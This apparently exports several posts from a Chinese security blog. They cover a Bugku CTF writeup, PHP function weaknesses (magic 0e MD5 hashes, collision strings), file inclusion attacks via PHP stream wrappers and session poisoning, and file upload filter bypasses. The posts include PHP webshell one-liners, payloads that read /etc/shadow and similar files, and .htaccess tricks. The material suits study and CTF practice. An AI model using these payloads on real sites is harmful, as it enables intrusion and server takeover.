[, int $offset = 0 ]]] ) $pattern: 要搜索的模式，字符串形式 $subject: 输入字符串 分析代码可知，传入参数必须使用POST方法，这题好像出错了，只要POST一个数据就可以得到flag 正确的解题方法应该是： 由要让0 &gt;= preg_match(&#39;/^[[:graph:]]&#123;12,&#125;$/&#39;, $password)为FALSE可知password的长度应该在12个字符及以上(非空格非TAB之外的内容) 由 12$reg &#x3D; &#39;&#x2F;([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)&#x2F;&#39;; if (6 &gt; preg_match_all($reg, $password, $arr)) 可知，匹配到的次数要大于6次（任意字符或大小写字母或数字） 由 1234567$ps &#x3D; array(&#39;punct&#39;, &#39;digit&#39;, &#39;upper&#39;, &#39;lower&#39;); &#x2F;&#x2F;[[:punct:]] 任何标点符号 [[:digit:]] 任何数字 [[:upper:]] 任何大写字母 [[:lower:]] 任何小写字母 foreach ($ps as $pt) &#123; if (preg_match(&quot;&#x2F;[[:$pt:]]+&#x2F;&quot;, $password)) $c +&#x3D; 1; &#125; if ($c &lt; 3) break; 可知，必须要有大小写字母，数字，字符内容三种与三种以上 1if (&quot;42&quot; &#x3D;&#x3D; $password) echo $flag; 必须弱等于42 payload：POST过去 password=42.0000e%2b000000000 password=420.000000000000e-1 %2b为+号的url编码，-号的url编码为- 这里用的是科学计数法绕过 出现flag&#123;test&#125;才意味着得到真正的flag","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://www.moonback.xyz/tags/writeup/"},{"name":"bugku","slug":"bugku","permalink":"http://www.moonback.xyz/tags/bugku/"},{"name":"代码审计","slug":"代码审计","permalink":"http://www.moonback.xyz/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"php一些常见函数漏洞","slug":"php-function-leak","date":"2019-09-25T14:16:40.000Z","updated":"2020-10-06T13:15:28.322Z","comments":true,"path":"2019/09/25/php-function-leak/","link":"","permalink":"http://www.moonback.xyz/2019/09/25/php-function-leak/","excerpt":"本篇博客介绍了php的一些常见函数的漏洞！","text":"本篇博客介绍了php的一些常见函数的漏洞！ md5()函数md5弱比较PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。 攻击者可以利用这一漏洞，通过输入一个经过哈希后以”0E”开头的字符串，即会被PHP解释为0，如果数据库中存在这种哈希值以”0E”开头的密码的话，他就可以以这个用户的身份登录进去，尽管并没有真正的密码。 但并不是所有MD5值0e开头的都弱相等，只有一些特殊的字符串，即后面是纯数字的 0e开头的md5和原值： 240610708 0e462097431906509019562988736854 QNKCDZO 0e830400451993494058024219903391 s878926199a 0e545993274517709034328855841020 s155964671a 0e342768416822451524974117254469 s214587387a 0e848240448830537924465865611904 s214587387a 0e848240448830537924465865611904 s878926199a 0e545993274517709034328855841020 s1091221200a 0e940624217856561557816327384675 s1885207154a 0e509367213418206700842008763514 s1502113478a 0e861580163291561247404381396064 s1885207154a 0e509367213418206700842008763514 s1836677006a 0e481036490867661113260034900752 s155964671a 0e342768416822451524974117254469 s1184209335a 0e072485820392773389523109082030 s1665632922a 0e731198061491163073197128363787 s1502113478a 0e861580163291561247404381396064 s1836677006a 0e481036490867661113260034900752 s1091221200a 0e940624217856561557816327384675 s155964671a 0e342768416822451524974117254469 s1502113478a 0e861580163291561247404381396064 s155964671a 0e342768416822451524974117254469 s1665632922a 0e731198061491163073197128363787 s155964671a 0e342768416822451524974117254469 s1091221200a 0e940624217856561557816327384675 s1836677006a 0e481036490867661113260034900752 s1885207154a 0e509367213418206700842008763514 s532378020a 0e220463095855511507588041205815 s878926199a 0e545993274517709034328855841020 s1091221200a 0e940624217856561557816327384675 s214587387a 0e848240448830537924465865611904 s1502113478a 0e861580163291561247404381396064 s1091221200a 0e940624217856561557816327384675 s1665632922a 0e731198061491163073197128363787 s1885207154a 0e509367213418206700842008763514 s1836677006a 0e481036490867661113260034900752 s1665632922a 0e731198061491163073197128363787 s878926199a 0e545993274517709034328855841020 还有MD5和双MD5以后的值都是0e开头的 CbDLytmyGm2xQyaLNhWn 770hQgrBOjrcqftrlaZk 7r4lGXCH2Ksu2JNT3BYM 不能处理数组md5()函数和sha1()函数一样，如果成功则返回已计算的哈希散列，如果失败则返回NULL，对于一些比较可以通过此方法绕过 md5碰撞两个MD5相同的不同字符串 Param1=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2 Param2=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2 sha1()函数也有相似的碰撞 a=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1&amp; b=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1 注意提交时使用bp抓包，不能直接提交，否则的话浏览器解码，数据会不完整，其实就相当于比较两个文件的hash strcmp()函数strcmp() 函数用于比较两个字符串 假设比较的两字符串为string1和string2，函数的返回值将有下面三种情况： 0 - 如果两个字符串相等 &lt;0 - 如果 string1 小于 string2 0 - 如果 string1 大于 string2 当比较数组和字符串的时候，返回是NULL is_numeric()函数用于检测变量是否为数字或数字字符串，是数字和数字字符串则返回 TRUE，否则返回 FALSE,包括数组 is_numeric()函数检测的时候会自动过滤掉前面的 ‘ ‘, ‘\\t’, ‘\\n’, ‘\\r’, ‘\\v’, ‘\\f’等字符，但是不会过滤 ‘\\0’，如果这些字符出现在字符串尾，也不会过滤，而是返回 false。 var_dump(is_numeric(&quot;\\01&quot;)); // false var_dump(is_numeric(&quot; 1&quot;)); // true var_dump(is_numeric(&quot;\\t1&quot;)); // true var_dump(is_numeric(&quot;\\n1&quot;)); // true var_dump(is_numeric(&quot;\\r1&quot;)); // true var_dump(is_numeric(&quot;\\v1&quot;)); // true var_dump(is_numeric(&quot;\\f1&quot;)); // true var_dump(is_numeric(&quot;\\f\\f1&quot;)); // true var_dump(is_numeric(&quot;1\\f&quot;)); // false 如果有两个is_numeric判断的时候用and连接起来，and后面的is_numberic判断可忽略 is_numeric(&#39;1&#39;) and is_numeric(&#39;a&#39;) //true 这个函数在对16进制形式字符串识别时在php7和5不同 123&lt;?phpvar_dump(is_numeric(&#x27;0x233333&#x27;)); // php7 bool(false)var_dump(is_numeric(&#x27;0x233333&#x27;)); // php5 bool(ture) ereg()函数ereg()函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。 如果没有传递入可选参数 regs 或者所匹配的字符串长度为 0，则本函数返回 1 int ereg ( string $pattern , string $string [, array &amp;$regs ] ) 利用： ereg函数存在00截断漏洞，当ereg读取字符串string时,如果遇到了%00,后面的字符串就不会被解析。 ereg函数处理数组，会返回NULL strpos()函数用于查找字符串首次出现的位置 int strpos( string $haystack, mixed $needle[, int $offset = 0] ) haystack 在该字符串中进行查找。 needle 如果 needle 不是一个字符串，那么它将被转换为整型并被视为字符的顺序值。 offset 如果提供了此参数，搜索会从字符串该字符数的起始位置开始统计。如果是负数，搜索会从字符串结尾指定字符数开始。 如果没找到 needle，将返回 FALSE。 利用当$haystack为数组时，函数返回NULL，当$needle为数组时函数返回flase preg_match()函数限制开头结尾，不是多行匹配，如 123456789&lt;?php$json = &quot;\\nflag&quot;;if (preg_match(&#x27;/^flag$/&#x27;, $json)) &#123; echo &#x27;hacker&#x27;;&#125;else&#123; echo 123;&#125;// 输出123 另外还有最大次数正则回溯绕过 intval函数Intval函数用于获取变量整数数值Intval最大的值取决于操作系统。 32 位系统最大带符号的 integer 范围是 -2147483648 到 2147483647。举例，在这样的系统上， intval(‘1000000000000’) 会返回 2147483647。64 位系统上，最大带符号的 integer 值是 9223372036854775807。 这个有个应用就是在判断数值是不是回文上，如果参数为2147483647，那么当它反过来，由于超出了限制，所以依然等于2147483647。即为回文。 intval函数能被%00截断，例如： 1234567&lt;?php$number=&#x27;0&#x27;.chr(0).&#x27;123&#x27;;var_dump(intval($number));if($number!=strval(intval($number)))&#123; echo 123;&#125;// 输出123 switch函数如果switch是数字类型的case的判断时，switch会将其中的参数转换为int类型，效果相当于intval函数，例如： 123456789101112&lt;?php$i =&quot;abc&quot;; switch ($i) &#123; case 0: echo 123; break; case 1: echo 456; break;&#125; ?&gt;// 输出123 switch没有碰到break时会一直往下执行，直到遇到break,例如： 1234567891011&lt;?php$i =&quot;abc&quot;; switch ($i) &#123; case 0: echo 123; case 1: echo 456; break;&#125;// 输出123456","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://www.moonback.xyz/tags/web/"},{"name":"ctf","slug":"ctf","permalink":"http://www.moonback.xyz/tags/ctf/"},{"name":"php函数","slug":"php函数","permalink":"http://www.moonback.xyz/tags/php%E5%87%BD%E6%95%B0/"}]},{"title":"文件包含漏洞及利用方式","slug":"file-contant-leak","date":"2019-09-20T11:55:59.000Z","updated":"2020-02-16T07:16:09.554Z","comments":true,"path":"2019/09/20/file-contant-leak/","link":"","permalink":"http://www.moonback.xyz/2019/09/20/file-contant-leak/","excerpt":"本篇博客主要介绍了文件包含漏洞及利用方式！","text":"本篇博客主要介绍了文件包含漏洞及利用方式！ 有关包含的函数PHP中文件包含函数有以下四种： include() include_once() require() require_once() include和require区别主要是，include在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行；而require函数出现错误的时候，会直接报错并退出程序的执行。 而include_once()，require_once()这两个函数，与前两个的不同之处在于这两个函数只包含一次，适用于在脚本执行期间同一个文件有可能被包括超过一次的情况下，你想确保它只被包括一次以避免函数重定义，变量重新赋值等问题。 本地包含LFI(Local File Inclusion)无限制本地文件包含漏洞测试代码： 1234&lt;?php $filename &#x3D; $_GET[&#39;filename&#39;]; include($filename);?&gt; 通过目录遍历漏洞可以获取到系统中其他文件的内容： 常见的敏感信息路径： Windows系统 1234567891011c:\\boot.ini &#x2F;&#x2F; 查看系统版本c:\\windows\\system32\\inetsrv\\MetaBase.xml &#x2F;&#x2F; IIS配置文件c:\\windows\\repair\\sam &#x2F;&#x2F; 存储Windows系统初次安装的密码c:\\ProgramFiles\\mysql\\my.ini &#x2F;&#x2F; MySQL配置c:\\ProgramFiles\\mysql\\data\\mysql\\user.MYD &#x2F;&#x2F; MySQL root密码c:\\windows\\php.ini &#x2F;&#x2F; php 配置信息 Linux/Unix系统 12345678910111213&#x2F;etc&#x2F;passwd &#x2F;&#x2F; 账户信息&#x2F;etc&#x2F;shadow &#x2F;&#x2F; 账户密码文件&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F; Apache2默认配置文件&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;extra&#x2F;httpd-vhost.conf &#x2F;&#x2F; 虚拟网站配置&#x2F;usr&#x2F;local&#x2F;app&#x2F;php5&#x2F;lib&#x2F;php.ini &#x2F;&#x2F; PHP相关配置&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F; Apache配置文件&#x2F;etc&#x2F;my.conf &#x2F;&#x2F; mysql 配置文件 session文件包含漏洞利用条件：session的存储位置可以获取 通过phpinfo的信息可以获取到session的存储位置。通过phpinfo的信息，获取到session.save_path为/var/lib/php/session： 获取到session的存储位置 通过猜测默认的session存放位置进行尝试。如linux下默认存储在/var/lib/php/session目录下： session中的内容可以被控制，传入恶意代码。 示例： 123456789&lt;?phpsession_start();$ctfs&#x3D;$_GET[&#39;ctfs&#39;];$_SESSION[&quot;username&quot;]&#x3D;$ctfs;?&gt; 漏洞分析: 此php会将获取到的GET型ctfs变量的值存入到session中。 当访问http://www.ctfs-wiki/session.php?ctfs=ctfs 后，会在/var/lib/php/session目录下存储session的值。 session的文件名为sess_+sessionid，sessionid可以通过开发者模式获取。 所以session的文件名为sess_akp79gfiedh13ho11i6f3sm6s6。 到服务器的/var/lib/php/session目录下查看果然存在此文件，内容为： username|s:4:&quot;ctfs&quot;; [root@c21336db44d2 session]# cat sess_akp79gfiedh13ho11i6f3sm6s6 username|s:4:&quot;ctfs&quot; 漏洞利用 通过上面的分析，可以知道ctfs传入的值会存储到session文件中，如果存在本地文件包含漏洞，就可以通过ctfs写入恶意代码到session文件中，然后通过文件包含漏洞执行此恶意代码getshell。 当访问http://www.ctfs-wiki/session.php?ctfs=&lt;?php phpinfo();?&gt;后，会在/var/lib/php/session目录下存储session的值 [root@6da845537b27 session]# cat sess_83317220159fc31cd7023422f64bea1a username|s:18:&quot;&lt;?php phpinfo();?&gt;&quot;; 攻击者通过phpinfo()信息泄露或者猜测能获取到session存放的位置，文件名称通过开发者模式可获取到，然后通过文件包含的漏洞解析恶意代码getshell。 有限制本地文件包含漏洞绕过%00截断条件：magic_quotes_gpc = Off php版本&lt;5.3.4 测试代码： 1234&lt;?php $filename &#x3D; $_GET[&#39;filename&#39;]; include($filename . &quot;.html&quot;);?&gt; 测试结果： http://www.ctfs-wiki.com/FI/FI.php?filename=../../../../../../../boot.ini%00 路径长度截断条件：windows OS，点号需要长于256；linux OS 长于4096 Windows下目录最大长度为256字节，超出的部分会被丢弃； Linux下目录最大长度为4096字节，超出的部分会被丢弃。 测试代码： 1234&lt;?php $filename &#x3D; $_GET[&#39;filename&#39;]; include($filename . &quot;.html&quot;);?&gt; EXP: http://www.ctfs-wiki.com/FI/FI.php?filename=test.txt/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././ 点号截断条件：windows OS，点号需要长于256 测试代码： 1234&lt;?php $filename &#x3D; $_GET[&#39;filename&#39;]; include($filename . &quot;.html&quot;);?&gt; EXP: http://www.ctfs-wiki.com/FI/FI.php？filename=test.txt................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................. 远程包含RFI(Remote File Inclusion)PHP的配置文件allow_url_fopen和allow_url_include设置为ON，include/require等包含函数可以加载远程文件，如果远程文件没经过严格的过滤，导致了执行恶意文件的代码，这就是远程文件包含漏洞。 allow_url_fopen = On（是否允许打开远程文件，PHP&lt;5.2默认打开，） allow_url_include = On（是否允许include/require远程文件，默认关闭） 无限制远程文件包含漏洞测试代码： 1234&lt;?php $filename &#x3D; $_GET[&#39;filename&#39;]; include($filename);?&gt; 通过远程文件包含漏洞，包含php.txt可以解析。 http://www.ctfs-wiki.com/FI/FI.php?filename=http://192.168.91.133/FI/php.txt 测试结果： 有限制远程文件包含漏洞绕过测试代码： &lt;?php include($_GET[&#39;filename&#39;] . &quot;.html&quot;); ?&gt; 代码中多添加了html后缀，导致远程包含的文件也会多一个html后缀。 问号绕过http://www.ctfs-wiki.com/FI/WFI.php?filename=http://192.168.91.133/FI/php.txt? #号绕过http://www.ctfs-wiki.com/FI/WFI.php?filename=http://192.168.91.133/FI/php.txt%23 还有哪些可以绕过？用burp跑一遍发现空格也可以绕过： php伪协议PHP 带有很多内置 URL 风格的封装协议，可用于类似 fopen()、 copy()、 file_exists() 和 filesize() 的文件系统函数。 除了这些封装协议，还能通过 stream_wrapper_register()来注册自定义的封装协议。 目录 php:// 输入输出流PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。 php://filter（本地磁盘文件进行读取）元封装器，设计用于”数据流打开”时的”筛选过滤”应用，对本地磁盘文件进行读写。 用法： ?filename=php://filter/convert.base64-encode/resource=xxx.php ?filename=php://filter/read=convert.base64-encode/resource=xxx.php 一样。 条件：只是读取，需要开启 allow_url_fopen，不需要开启 allow_url_include； 测试代码： 1234&lt;?php $filename &#x3D; $_GET[&#39;filename&#39;]; include($filename);?&gt; php://input可以访问请求的原始数据的只读流。即可以直接读取到POST上没有经过解析的原始数据。 enctype=”multipart/form-data” 的时候 php://input是无效的。 用法： ?file=php://input 数据利用POST传过去。 php://input （读取POST数据）碰到file_get_contents()就要想到用php://input绕过，因为php伪协议也是可以利用http协议的，即可以使用POST方式传数据，具体函数意义下一项； 测试代码： 123&lt;?php echo file_get_contents(&quot;php:&#x2F;&#x2F;input&quot;);?&gt; 测试结果： php://input（写入木马）测试代码： 1234&lt;?php $filename &#x3D; $_GET[&#39;filename&#39;]; include($filename);?&gt; 条件：php配置文件中需同时开启 allow_url_fopen 和 allow_url_include（PHP &lt; 5.3.0）,就可以造成任意代码执行，在这可以理解成远程文件包含漏洞（RFI），即POST过去PHP代码，即可执行。 如果POST的数据是执行写入一句话木马的PHP代码，就会在当前目录下写入一个木马。 &lt;?PHP fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[cmd])?&gt;&#39;);?&gt; 测试结果： 如果不开启allow_url_include会报错： php://input（命令执行）测试代码： 1234&lt;?php $filename &#x3D; $_GET[&#39;filename&#39;]; include($filename);?&gt; 条件：php配置文件中需同时开启 allow_url_fopen 和 allow_url_include（PHP &lt; 5.30）,就可以造成任意代码执行，在这可以理解成远程文件包含漏洞（RFI），即POST过去PHP代码，即可执行； 如果不开启allow_url_include会报错： file://伪协议 （读取文件内容）通过file协议可以访问本地文件系统，读取到文件的内容 测试代码： 1234&lt;?php $filename &#x3D; $_GET[&#39;filename&#39;]; include($filename);?&gt; data://伪协议数据流封装器，和php://相似都是利用了流的概念，将原本的include的文件流重定向到了用户可控制的输入流中，简单来说就是执行文件的包含方法包含了你的输入流，通过你输入payload来实现目的； data://text/plain;base64,dGhlIHVzZXIgaXMgYWRtaW4 data://（读取文件） 和php伪协议的input类似，碰到file_get_contents()来用； &lt;?php // 打印 “I love PHP” echo file_get_contents(‘data://textplain;base64,SSBsb3ZlIFBIUAo=’); ?&gt; 注意：&lt;span style=&quot;color: rgb(121, 121, 121);&quot;&gt;&lt;?php phpinfo();,这类执行代码最后没有?&gt;&lt;/span&gt;闭合; 如果php.ini里的allow_url_include=On（PHP &lt; 5.3.0）,就可以造成任意代码执行，同理在这就可以理解成远程文件包含漏洞（RFI） 测试代码： 1234&lt;?php $filename &#x3D; $_GET[&#39;filename&#39;]; include($filename);?&gt; phar://伪协议这个参数是就是php解压缩包的一个函数，不管后缀是什么，都会当做压缩包来解压。 用法： ?file=phar://压缩包/内部文件 phar://xxx.png/shell.php 注意： PHP &gt; =5.3.0 压缩包需要是zip协议压缩，rar不行，将木马文件压缩后，改为其他任意格式的文件都可以正常使用。 步骤： 写一个一句话木马文件shell.php，然后用zip协议压缩为shell.zip，然后将后缀改为png等其他格式。 测试代码： 1234&lt;?php $filename &#x3D; $_GET[&#39;filename&#39;]; include($filename);?&gt; zip://伪协议zip伪协议和phar协议类似，但是用法不一样。 用法： ?file=zip://[压缩文件绝对路径]#[压缩文件内的子文件名] zip://xxx.png#shell.php。 条件： PHP &gt; =5.3.0，注意在windows下测试要5.3.0&lt;PHP&lt;5.4 才可以 #在浏览器中要编码为%23，否则浏览器默认不会传输特殊字符。 测试代码： 1234&lt;?php $filename &#x3D; $_GET[&#39;filename&#39;]; include($filename);?&gt; 文件包含的一些骚操作包含一些敏感文件/proc/self/environ文件： 向User-Agent头中注入PHP代码，包含成功就能得到shell 这个 self 不要以为就是 self 文件夹，实际上子目录/proc/self本身就是当前运行进程 PID 贪婪包含一个payload: 1?img&#x3D;php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;..&#x2F;flag.php|jpg data://协议利用条件： 1、php 版本大于等于 php5.2 2、allow_url_fopen = On 3、allow_url_include = On 利用 data:// 伪协议进行代码执行的思路原理和 php:// 是类似的，都是利用了 PHP 中的流的概念，将原本的 include 的文件流重定向到了用户可控制的输入流中 123?file&#x3D;data:text&#x2F;plain,&lt;?php phpinfo();?&gt;?file&#x3D;data:text&#x2F;plain;base64,base64编码的payloadindex.php?file&#x3D;data:text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b 加号 + 的 url 编码为 %2b，PD9waHAgcGhwaW5mbygpOz8+ 的 base64 解码为：&lt;?php phpinfo();?&gt; 路径长度截断这个要求php版本&lt; 5.3.10 123456789&lt;?phpif (empty($_GET[&quot;file&quot;]))&#123; echo(&#x27;../flag.php&#x27;); return;&#125;else&#123; $filename=&#x27;pages/&#x27;.(isset($_GET[&quot;file&quot;])?$_GET[&quot;file&quot;]:&quot;welcome.txt&quot;).&#x27;.html&#x27;; include $filename;&#125; flag 文件放在上层目录 这时我们可以使用字符 ./. 和 ./ 来进行绕过，因为文件路径有长度限制 windows 259 个 bytes linux 4096 个 bytes 参考：https://www.freebuf.com/articles/web/182280.html","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://www.moonback.xyz/tags/web/"},{"name":"文件包含","slug":"文件包含","permalink":"http://www.moonback.xyz/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"}]},{"title":"文件上传及其利用方式","slug":"file-upload-leak","date":"2019-09-10T12:40:10.000Z","updated":"2019-10-17T05:54:30.410Z","comments":true,"path":"2019/09/10/file-upload-leak/","link":"","permalink":"http://www.moonback.xyz/2019/09/10/file-upload-leak/","excerpt":"本篇博客主要介绍了文件上传漏洞及一些常见的利用方式，包括一些简单的绕过方式，一些常见的网站容器解析漏洞，以及图片马的制作和使用等等！","text":"本篇博客主要介绍了文件上传漏洞及一些常见的利用方式，包括一些简单的绕过方式，一些常见的网站容器解析漏洞，以及图片马的制作和使用等等！ 简介文件上传漏洞是指对用户文件上传部分的控制不足或者处理缺陷，而导致的用户可以越过其本身权限向服务器上上传可执行的动态脚本文件。这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。 客户端校验本地js检测在上传时，数据还未发送过去，便发出警告 绕过方法： 先将上传的文件改为可以上传的扩展名，上传时使用Burpsuite拦截数据包，将木马的扩展名改为原来的php,即可绕过客户端的验证 F12修改js代码 服务端校验MIME类型检测MIME类型是什么？ 在把输出结果传送到浏览器上的时候，浏览器必须启动应用程序来处理这个输出文档。这可以通过多种类型MIME（多功能网际邮件扩充协议）来完成。在HTTP中，MIME类型被定义在Content-Type header中。 常见的MIME类型： .html text/html .txt text/plain .gif image/gif .jpg image/jpeg .png image/png 绕过方法： 通过burpsuite来修改文件的类型(Content-Type)进行过滤即可 文件内容头检测通过检测文件头内容判断上传文件的合法性 绕过方法： 在恶意脚本前加上允许上传文件的头标识(比如GIF89a，会解析成gif文件) 黑名单与白名单通过判断后缀名来确定上传文件的合法性 黑名单绕过方法： 大小写绕过，例如Php、PhP 利用黑名单中没有的，但是又能够被解析的后缀名，例如php、 php3、 php4、php5、php7、pht、phtml、phps 配合解析利用方法，将上传的文件当作php代码执行 使用00截断(基于一个组合逻辑漏洞造成的，通常存在于构造上传文件路径的时候) 超长文件名截断上传(windows 258byte | linux 4096byte)白名单绕过方法不太好绕过，一般都是配合解析漏洞 waf绕过姿势竞争上传情景： 文件上传后，检测是否合法，不合法就删除 利用方式： 在删除前访问到上传的文件 &lt;?php $file = &#39;web.php&#39;; $shell = &#39;&lt;?php eval($_POST[&quot;key&quot;])?&gt;&#39;; file_put_contents($file,$shell); ?&gt; 用bp同时上传和访问，虽然上传的文件被删除了，但可以通过访问web.php 双文件上传在一个文件上传的地方，右键审查元素，首先修改action为完整路径，然后复制粘贴上传浏览文件（&lt;input ……），这样就会出现两个上传框，第一个上传正常文件，第二个选择一句话木马，然后提交。 垃圾数据有些主机WAF软件为了不影响web服务器的性能，会对校验的用户数据设置大小上限，比如1M。此种情况可以构造一个大文件，前面1M的内容为垃圾内容，后面才是真正的木马内容，便可以绕过WAF对文件内容的校验； 当然也可以将垃圾数据放在数据包最开头，这样便可以绕过对文件名的校验。 filename针对早期版本安全狗，可以多加一个filename 或者将filename换位置，在IIS6.0下如果我们换一种书写方式，把filename放在其他地方： POST/GET有些WAF的规则是：如果数据包为POST类型，则校验数据包内容。此种情况可以上传一个POST型的数据包，抓包将POST改为GET。 文件重命名绕过如果web程序会将filename除了扩展名的那段重命名的话，那么还可以构造更多的点、符号等等。 特殊的长文件名绕过文件名使用非字母数字，比如中文等最大程度的拉长，不行的话再结合一下其他的特性进行测试： shell.asp;王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王.jpg 图片马将图片和一句话在cmd下合成后，以php脚本执行时合成的一句话也会被执行 当一句话被执行时，浏览器访问时看不到一句话代码 制作在cmd中输入 copy a.jpg/b+a.php shell.jpg 利用 配合文件包含漏洞 配合网站容器解析漏洞 常见网站容器解析漏洞Apache多后缀名Apache对于文件名的解析是从后往前解析的，直到遇见一个Apache认识的文件类型为止 如： hello.php.rar.rar.rar Apache不认识.rar这个文件类型，会一直遍历到.php 在phpstudy网站目录存放一张a.jpg图片，将其改名为a.jpg.abc，再用浏览器去访问这张图片，发现被成功解析为图片： 那么现在在网站目录存放一个ma.php文件，里面内容为： 123&lt;?phpecho &#39;good&#39;;?&gt; 再将其改名为ma.php.abc，访问这个文件： 发现其并没有被解析，而是直接将里面的内容显示了出来，这是因为Apache本身并不懂php，而是将这个文件交给php解释器，php解释器和Apache有着不同的解析规则； 在phpStudy\\PHPTutorial\\Apache\\conf\\extra找到httpd-php.conf这个配置文件，打开可以看到 123&lt;FilesMatch &quot;\\.php$&quot;&gt; SetHandler application&#x2F;x-httpd-php&lt;&#x2F;FilesMatch&gt; 我们可以知道，只有当文件名后缀为.php时，文件才能被当做php执行，那么现在将其改为： 123&lt;FilesMatch &quot;\\.php\\.&quot;&gt; SetHandler application&#x2F;x-httpd-php&lt;&#x2F;FilesMatch&gt; 重启phpstudy，可以看到ma.php.abc已经可以被解析了： 罕见后缀在某些情况下，不只是php，就连phtml、pht、php3、php4和php5都是Apache和php认可的php程序的文件后缀 妙用.HTACCESSApache提供了一种很方便的、可作用于当前目录及其子目录的分布式配置文件：.htaccess 要使.htaccess文件生效，需要在Apache的配置文件中写上(这里我的配置文件中默认就有以下配置)： AllowOverride All LoadModule rewrite_module modules/mod_rewrite.so 之后，我们测试用.htaccess文件修改php解释器配置： 新建一个.htaccess文件，由于windows不支持文件名以小数点开头，需要用到cmd命令： echo &gt; .htaccess 这样即可生成.htaccess文件；在这个文件里面写入： 123&lt;FilesMatch &quot;xxx&quot;&gt; SetHandler application&#x2F;x-httpd-php &lt;&#x2F;FilesMatch&gt; 即让php解释器将文件名中含有xxx的文件解析为php 